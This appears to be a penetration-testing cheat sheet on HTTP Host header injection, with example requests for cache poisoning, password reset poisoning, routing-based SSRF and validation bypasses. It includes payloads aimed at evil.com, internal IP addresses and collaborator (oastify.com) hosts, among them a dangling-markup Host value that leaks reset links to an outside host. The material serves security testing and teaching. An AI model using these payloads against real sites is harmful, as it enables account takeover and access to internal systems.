## Table of Contents
1. [Introduction](#introduction)
2. [Where to Put a Host Header Injection Payload?](#where-to-put-a-host-header-injection-payload)
3. [How to Test for Host Header Injection?](#how-to-test-for-host-header-injection)
   - 3.1 [Supply an Arbitrary Host Header](#supply-an-arbitrary-host-header)
   - 3.2 [Accessing Restricted Functionality or Routing-Based SSRF](#accessing-restricted-functionality-or-routing-based-ssrf)
   - 3.3 [Send Ambiguous Requests](#send-ambiguous-requests)
      - 3.3.1 [Inject Duplicate Host Headers](#inject-duplicate-host-headers)
      - 3.3.2 [Add Line Wrapping](#add-line-wrapping)
      - 3.3.3 [Supply an Absolute URL](#supply-an-absolute-url)
      - 3.3.4 [SSRF via Flawed Request Parsing](#ssrf-via-flawed-request-parsing)
      - 3.3.5 [Inject Host Override Headers](#inject-host-override-headers)
   - 3.4 [Connection State Attacks](#connection-state-attacks)
   - 3.5 [SSRF via a Malformed Request Line](#ssrf-via-a-malformed-request-line)
   - 3.6 [Check for Flawed Validation](#check-for-flawed-validation)

## Introduction
**Host Header Injection** is a web security vulnerability that occurs when an application improperly trusts the value of the "Host" header in an HTTP request. If an attacker can manipulate this header and the server processes or uses it without validation, the attacker may exploit it for various attacks, such as web cache poisoning, server-side request forgery (SSRF), password reset poisoning, or bypassing access control mechanisms.

### Where to Put a Host Header Injection Payload?

A Host Header Injection payload is placed directly in the "Host" header of an HTTP request. The attacker modifies the value of the header to exploit the vulnerability. Here are some example scenarios:

### Normal Case
If an application generates absolute links based on the "Host" header, you can manipulate the header value to control the generated links.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: evil.com
```
If the server uses the "Host" header to build links like `http://original-website.com/page`, it may now generate `http://evil.com/page`, potentially allowing the attacker to perform phishing attacks.

### Web Cache Poisoning Using Host Header Injection

If the application is cached based on the "Host" header, an attacker can manipulate the cache to store a malicious response.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: vulnerable-website.com
```
Here, the attacker manipulates the "Host" header to `evil.com`, while the actual content belongs to the original website. If this response gets cached, future visitors may see the attacker's content.

### Password Reset Poisoning via Host Header Injection

When an application sends password reset links based on the "Host" header, an attacker can manipulate the header to send a reset link pointing to their controlled domain.

**Example HTTP Request:**
```
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

email=user@victim.com
```
In this case, the password reset link may be generated using `evil.com`, making the victim click on a malicious link controlled by the attacker.

### Exploiting Host Header Injection for SSRF

Host Header Injection can be combined with SSRF if the server uses the "Host" header to perform server-side requests.

**Example HTTP Request:**
```
GET /internal-api HTTP/1.1
Host: 127.0.0.1
```
Here, the server might use the "Host" header to make requests internally, allowing the attacker to access internal resources.

# How to Test for Host Header Injection?
___
## Supply an arbitrary Host header
If vulnerable, this will generate 200 OK response or 504 server gateway error.
```txt
GET /example HTTP/1.1
Host: google.com
```
## Accessing restricted functionality or Routing Based SSRF
#### It is common for websites to not restrict access to certain functionality for internal users only or host private sites in same server. Try to access it by localhost or brute-forcing.
```txt
Host: localhost
Host: 127.0.0.1
Host: 192.168.0.$fuzz$
```
## Send ambiguous requests
#### Inject duplicate Host headers
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: google.com
```
#### Add line wrapping
```txt
GET /example HTTP/1.1
    Host: google.com
Host: vulnerable-website.com
```
#### Supply an absolute URL
##### Normal case
```txt
GET https://vulnerable-website.com/ HTTP/1.1
Host: google.com
```
##### SSRF via flawed request parsing
```txt
GET https://0ada009a03fb929382cd2e7000e600be.web-security-academy.net HTTP/2
Host: ybdifpxyiesrimyyvm2e9wxgy74yssgh.oastify.com
```
In this case, now try bruteforcing ip address.
#### Inject host override headers
Here are examples for each of the headers, showing how they might be used in practice:

1. **X-Forwarded-Host**:  
   *Example:*  
   ```
   X-Forwarded-Host: example.com
   ```  
   *Use Case:* Change the original host. You can use this for password reset poisoning.

2. **X-Host**:  
   *Example:*  
   ```
   X-Host: internal-service.local
   ```  
   *Use Case:* 

3. **X-Original-URL**:  
   *Example:*  
   ```
   X-Original-URL: /original-path/resource
   ```  
   *Use Case:* A reverse proxy rewrites the URL, but passes along the original URL (`/original-path/resource`) to the backend for logging or debugging.

4. **X-Forwarded-Server**:  
   *Example:*  
   ```
   X-Forwarded-Server: proxy-1.local
   ```  
   *Use Case:* In a multi-proxy environment, this header shows that the request was processed by `proxy-1.local` before reaching the backend.

5. **X-HTTP-Host-Override**:  
   *Example:*  
   ```
   X-HTTP-Host-Override: app.example.com
   ```  
   *Use Case:* A request routed through a proxy needs to override the default host with `app.example.com` for special internal API routing.

6. **Forwarded**:  
   *Example:*  
   ```
   Forwarded: for=192.0.2.43; proto=https; by=proxy-2.local
   ```  
   *Use Case:* Indicates that the request was originally sent by a client with IP `192.0.2.43` over HTTPS, and handled by `proxy-2.local`.

7. **X-Forwarded-For**:  
   *Example:*  
   ```
   X-Forwarded-For: 203.0.113.195, 198.51.100.17
   ```  
   *Use Case:* A request was forwarded through two proxies. The originating client IP is `203.0.113.195`, and the second proxy that forwarded the request has IP `198.51.100.17`.
Note: In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
## Connection state attacks
#### For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection. 
```
Step 1 >> Duplicate a request.
Step 2 >> Change the Connection header to keep-alive in 1st request.
Step 3 >> Change the request method GET to POST in 2nd request.
Step 4 >> Mention the administrator path and change the host to local ip in 2nd request.
Step 5 >> Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection) and send both request together.
```
```txt
POST /admin HTTP/1.1
Host: 192.168.0.1 
```
## SSRF via a malformed request line

A reverse proxy might take the path from the request line, prefix it with `http://backend-server`, and route the request to that upstream URL. If the path starts with `@` instead of `/`, the resulting upstream URL will be `http://backend-server@private-intranet/example`, which most HTTP libraries interpret as a request to access private-intranet with the username backend-server. So try to use `@` instead of `/`.

```txt
GET @private-intranet/example HTTP/1.1
```

## Check for flawed validation
Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. If this happen, try to use port or non numeric staff in port. (You can use this method for password reset link hijacking via dangling markup) (Check portswigger for more)
```txt
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
Host: vulnweb.com:'<a href="//8jsdeu8fe6r8ju28t0lsplhjhan1bvzk.oastify.com/? (Password reset link hijacking via dangling markup)
```
